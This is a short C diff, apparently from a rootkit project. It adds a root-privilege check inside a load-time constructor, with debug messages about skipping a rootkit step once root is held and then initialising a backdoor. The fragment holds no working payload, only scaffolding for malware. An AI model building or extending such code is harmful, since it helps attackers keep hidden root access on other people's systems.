@@ -138,6 +138,8 @@ __attribute__((constructor (102))) void pre_core(void)
 
 __attribute__((constructor (103))) int post_core(void)
 {
+    int uid;
+
 #ifdef DEBUG
     printf("Normal Operation!\r\n");
 #endif
@@ -153,6 +155,14 @@ __attribute__((constructor (103))) int post_core(void)
     {
 #ifdef DEBUG
         printf("We're already root, skip rootkit to gain root...\r\n");
+#endif
+    }
+
+    uid = getuid();
+    if(uid == 0)
+    {
+#ifdef DEBUG
+        printf("So we're root now... init_bkdoor!\r\n");
 #endif
     }
 
